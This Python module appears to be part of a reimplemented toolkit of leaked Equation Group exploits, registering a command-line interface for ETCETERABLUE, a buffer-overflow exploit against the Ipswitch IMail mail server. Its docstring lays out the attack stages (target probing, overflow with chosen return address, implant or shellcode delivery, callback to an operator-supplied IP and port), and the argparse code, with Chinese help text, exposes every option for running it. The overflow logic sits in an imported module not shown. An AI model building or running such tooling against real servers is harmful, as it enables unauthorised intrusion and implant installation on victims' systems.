#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
etbl — ETCETERABLUE (ETBL 1.1.1) IMAIL mail-server exploit.

Python rewrite of `ETBL.exe` recovered from
`EQGRP_Lost_in_Translation-master/windows/Resources/LegacyWindowsExploits/
Exploits/ETBL 1.1.1/ETBL.exe`.

ETBL exploits a buffer overflow in the IMAIL mail server (IMail by Ipswitch)
via its POP / SMTP / HTTP services.  It:

  1. Connects to the target mail service (POP on 110, SMTP on 25, or HTTP),
  2. Performs an optional Touch #1 (banner grab) or Touch #2 (login test)
     to confirm the target is vulnerable,
  3. Builds an overflow buffer with an OS-specific return address,
  4. Sends the exploit payload carrying an implant or shellcode,
  5. Optionally handles an Egg callback for implant upload.

Recovered strings from the binary identify it as "ETCETERABLUE":
  - "POP (port %d) - login required, may take up to 2 hours to be processed"
  - "SMTP (port %d) - no login"
  - "Touch target #1 - Banner Grab"
  - "Touch target #2 - Login Test"
  - "Egg will callback to upload implant code"
  - "Imail version"
  - "Return Address"
  - "ETCETERABLUE"

The original binary is a small Win32 console tool (~50 KB) that imports only
KERNEL32, MSVCRT and WS2_32, driving raw TCP sockets directly.

CLI mirrors the original argument block:

  etbl -i <TargetIp> -p <TargetPort> -r <RunOption> -c <ImplantSocketOption>
       -f <ImplantPayloadFile> -V <IMailVersion> -M <RecvAddress>
       [-l <ListeningPostDll>] [-t <TargetNetworkProtocol>]
       [-u <EggSocketOption>] [-I <EggCallbackIp>] [-P <EggCallbackPort>]
       [-o <Timeout>] [-R <ReturnAddress>]

run_option: 1 = Touch #1 (banner grab), 2 = Touch #2 (login test), 3 = Exploit
implant_socket_option: 1 = reuse existing socket, 2 = new socket
egg_socket_option: 1 = reuse existing exploit socket, 2 = egg callback
target_network_protocol: 1 = POP, 2 = SMTP, 3 = HTTP
imail_version: numeric IMail version string (used to pick return address)
"""

from . import etbl_exp


def etbl_handle(args):
    """Run the ETCETERABLUE exploit against the supplied target."""
    return etbl_exp.run_function(
        target=args.target,
        port=args.port,
        run_option=args.runoption,
        implant_socket_option=args.implant_socket_option,
        implant_file=args.implant,
        imail_version=args.imail_version,
        recv_address=args.recv_address,
        listening_post=args.listening_post,
        protocol=args.protocol,
        egg_socket_option=args.eggsocket,
        egg_callback_ip=args.egg_ip,
        egg_callback_port=args.eggport,
        timeout=args.timeout,
        return_address=args.return_address,
    )


def reg_subparser(subparsers):
    """Register the `etbl` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "etbl",
        help="ETCETERABLUE (ETBL 1.1.1) IMAIL mail-server 漏洞利用",
        description="ETCETERABLUE — Equation Group 针对 IMAIL 邮件服务器的"
                    " POP/SMTP/HTTP 缓冲区溢出漏洞利用工具。"
                    "支持 Touch（探测）和 Exploit（利用）两个阶段，"
                    "可选 Egg Callback 方式上传惯例负载。",
    )
    p.add_argument(
        "-i", "--target", metavar="IP",
        required=True,
        help="目标主机 IP 地址",
    )
    p.add_argument(
        "-p", "--port", type=int, default=0, metavar="PORT",
        help="目标端口（0 = 根据协议自动：POP 110 / SMTP 25 / HTTP 80）",
    )
    p.add_argument(
        "-r", "--runoption", type=int, choices=[1, 2, 3], default=3, metavar="OPT",
        help="运行选项：1=Touch #1 (横幅抓取)，2=Touch #2 (登录测试)，3=Exploit (默认 3)",
    )
    p.add_argument(
        "-c", "--implant-socket-option", type=int, choices=[1, 2], default=1, metavar="OPT",
        help="惯例套接字选项：1=复用现有利用套接字，2=新建套接字 (默认 1)",
    )
    p.add_argument(
        "-f", "--implant", metavar="FILE",
        help="植入负载文件路径",
    )
    p.add_argument(
        "-V", "--imail-version", metavar="VER",
        help="IMail 版本字符串（用于选择返回地址）",
    )
    p.add_argument(
        "-M", "--recv-address", metavar="ADDR",
        help="接收地址（用于 Egg Callback / 惯例回连）",
    )
    p.add_argument(
        "-l", "--listening-post", metavar="DLL",
        help="监听站 DLL 路径",
    )
    p.add_argument(
        "-t", "--protocol", type=int, choices=[1, 2, 3], default=1, metavar="PROTO",
        help="目标网络协议：1=POP，2=SMTP，3=HTTP (默认 1)",
    )
    p.add_argument(
        "-u", "--eggsocket", type=int, choices=[1, 2], default=1, metavar="OPT",
        help="Egg 套接字选项：1=复用现有利用套接字，2=Egg 回连 (默认 1)",
    )
    p.add_argument(
        "-I", "--egg-ip", metavar="IP",
        help="Egg Callback 回连 IP 地址",
    )
    p.add_argument(
        "-P", "--eggport", type=int, default=0, metavar="PORT",
        help="Egg Callback 端口",
    )
    p.add_argument(
        "-o", "--timeout", type=int, default=30, metavar="SEC",
        help="等待回复的秒数 (默认 30)",
    )
    p.add_argument(
        "-R", "--return-address", metavar="ADDR",
        help="自定义返回地址（如 0xdeadbeef，一般仅 HTTP 模式需要）",
    )
    p.set_defaults(func=etbl_handle)
